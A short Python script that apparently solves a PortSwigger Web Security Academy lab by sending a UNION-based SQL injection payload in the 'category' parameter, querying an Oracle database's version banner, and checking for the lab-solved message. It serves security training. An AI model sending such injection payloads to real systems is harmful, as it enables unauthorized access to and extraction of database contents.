import requests

url = "https://0a1f001b0333986f8096307500b900da.web-security-academy.net/filter"

cookies = {
    "session": "7VTRpwTJvUX7JiMiUNXtTzhSSBuDVWmi"
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": "https://portswigger.com",
    "Accept-Language": "en-US,en;q=0.9"
}

params = {
    "category": "Accessories' UNION SELECT banner, NULL FROM v$version--"
}

r = requests.get(url, headers=headers, cookies=cookies, params=params)

if "Congratulations, you solved the lab!" in r.text:
    print("Lab is Solved!")
else:
    print("Lab is not SolveD!")
    
print(r.text)